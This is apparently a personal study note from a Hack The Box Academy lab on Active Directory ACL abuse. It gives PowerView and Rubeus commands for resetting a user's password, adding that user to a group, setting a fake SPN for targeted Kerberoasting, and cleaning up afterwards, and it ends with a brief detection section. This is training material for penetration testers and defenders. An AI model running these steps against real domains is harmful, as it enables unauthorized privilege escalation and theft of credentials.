ACL Abuse Tactics
#################

Date: 2024-12-31 14:40:20

Status: #new

tags: :ref:`active directory enumeration attacks`

Scenario 1: Escalating by setting a new password
**************************************************

1. Use the wley user to change the password for the damundsen user
2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user


Step 1: Creating a PSCredential Object
=========================================

A PSCredential object in PowerShell is a data structure that represents a set of security credentials, 
typically a username and password. It is used to provide authentication information when 
executing commands that require it, such as connecting to remote systems, databases, or 
services. This object can be passed as a parameter to various cmdlets to run commands under 
a different user context, which is useful when the current user does not have the necessary 
permissions.


.. code-block:: powershell

    PS C:\htb> $SecPassword = ConvertTo-SecureString 'Academy_student_AD!' -AsPlainText -Force
    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\htb-student', $SecPassword) 

Step 2: Creating a secureString Object
==========================================

.. code-block:: powershell

    $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Step 3: Use :ref:`powerview` to change the password
=====================================================

.. code-block:: powershell

    PS C:\htb> cd C:\Tools\
    PS C:\htb> Import-Module .\PowerView.ps1
    PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

    VERBOSE: [Get-PrincipalContext] Using alternate credentials
    VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
    VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset

Scenario 2: Adding yourself to a group
****************************************

Step 1: Creating a SecureString Object using damundsen
========================================================

.. code-block:: powershell

    PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

Step 2: Add yourself to the group
===================================

.. code-block:: powershell

    PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

    VERBOSE: [Get-PrincipalContext] Using alternate credentials
    VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'

You can verify your membership to this group with

.. code-block:: powershell

    PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

Scenario 3: Taking over an account with new group membership
*************************************************************

At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use Set-DomainObject to create the fake SPN. We could use the tool targetedKerberoast to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

Step 1: Create a fake SPN
===========================

.. code-block:: powershell

    PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

    VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
    VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
    VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
    VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
    VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
    (&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
    VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'

If the above command worked, you should be able to use any kerberoasting tool like :ref:`rubeus`

.. code-block:: powershell

    PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

Now with possession of the hash, we can crack the password and perform a DCSync attack


Clean up your work
********************

Lets negate the work we did now that we have the admin account.

.. code-block:: powershell

    PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
    PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose


Detection and Remediation 
***************************

1. Audit and alert for removing dangerous ACLs
2. Monitor Group membership

Monitoring for EventID 5136 will help you detect these attacks. (https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136)

References 
***********
https://academy.hackthebox.com/module/143/section/1486
https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language